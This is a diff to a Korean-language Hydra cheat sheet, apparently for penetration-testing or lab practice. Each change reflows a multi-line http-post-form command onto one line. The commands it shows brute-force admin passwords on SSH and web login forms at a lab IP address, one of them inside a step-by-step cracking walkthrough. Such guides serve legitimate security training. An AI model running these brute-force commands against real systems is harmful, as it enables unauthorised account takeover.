@@ -78,8 +78,7 @@ hydra -L users.txt -P passwords.txt ssh://10.10.11.68 -t 4
 
 ```bash
 # HTTP POST 형식 지정 필요
-hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
-"/login.php:username=^USER^&password=^PASS^:F=로그인실패"
+hydra -l admin -P passwords.txt 10.10.11.68 http-post-form "/login.php:username=^USER^&password=^PASS^:F=로그인실패"
 ```
 
 구문:
@@ -138,8 +137,7 @@ hydra -L users.txt -P passwords.txt ssh://10.10.11.68 -t 4
 # 실패 메시지: "Invalid credentials"
 
 # 2단계: 크래킹
-hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
-"/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid credentials"
+hydra -l admin -P passwords.txt 10.10.11.68 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid credentials"
 
 # 3단계: 성공 시 해당 계정으로 로그인
 ```
@@ -219,8 +217,7 @@ hydra -l admin -P passwords.txt 10.10.11.68 http-get -e nsr
 ### HTTP-POST (웹 폼)
 ```bash
 # 가장 일반적
-hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
-"/login:username=^USER^&password=^PASS^:Invalid"
+hydra -l admin -P passwords.txt 10.10.11.68 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
 ```
 
 구문 분석:
@@ -232,8 +229,7 @@ hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
 ### HTTP-POST (세션)
 ```bash
 # 쿠키가 필요한 경우
-hydra -l admin -P passwords.txt 10.10.11.68 http-post-form \
-"/login:user=^USER^&pass=^PASS^:F=failed:C=/COOKIES.txt"
+hydra -l admin -P passwords.txt 10.10.11.68 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed:C=/COOKIES.txt"
 ```
 
 ### MySQL
